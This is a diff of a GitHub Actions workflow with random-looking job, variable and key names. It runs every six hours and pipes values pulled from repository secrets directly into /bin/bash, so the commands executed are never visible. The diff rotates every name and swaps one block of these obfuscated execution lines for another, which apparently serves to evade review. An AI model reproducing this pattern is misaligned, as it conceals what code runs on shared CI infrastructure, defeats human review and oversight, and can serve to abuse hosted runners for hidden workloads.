@@ -1,29 +1,26 @@
 name: donglaopo7654
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 3/6 * * *'
+    - cron: '34 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: donglaopo7654
         env:
-          ikfu3814: ${{ secrets.ikfu3814 }}
+          egt3099: ${{ secrets.egt3099 }}
         run: |
-          echo $ikfu3814 | jq -r .jtj4 | /bin/bash
-          echo $uyg0375 | jq -r .fd78628 | /bin/bash
-          echo $lcfum5609 | jq -r .j00 | /bin/bash
-          echo $tpgr06743 | jq -r .p70 | /bin/bash
-          echo $mrloq96242 | jq -r .pvft4 | /bin/bash
-          echo $zv40 | jq -r .pkx69966 | /bin/bash
-          echo $cp3 | jq -r .au6 | /bin/bash
-          echo $gkp7 | jq -r .le17 | /bin/bash
-          echo $aoyhy350 | jq -r .jjsws40148 | /bin/bash
-          echo $sfb1141 | jq -r .tcznj5487 | /bin/bash
-          echo $wjby8461 | jq -r .rze43683 | /bin/bash
-          echo $bzke75063 | jq -r .v5 | /bin/bash
-          echo $edcow2 | jq -r .cx6018 | /bin/bash
+          echo $egt3099 | jq -r .ckvgh576 | /bin/bash
+          echo $k168 | jq -r .pmnff8525 | /bin/bash
+          echo $og52 | jq -r .wjf4895 | /bin/bash
+          echo $tdgd81726 | jq -r .dpcb7662 | /bin/bash
+          echo $lvfdf94 | jq -r .gondd94944 | /bin/bash
+          echo $gos07033 | jq -r .br87 | /bin/bash
+          echo $cfm6 | jq -r .pio12 | /bin/bash
+          echo $fhtui286 | jq -r .f6 | /bin/bash
+          echo $lpnmj28845 | jq -r .p89 | /bin/bash
 
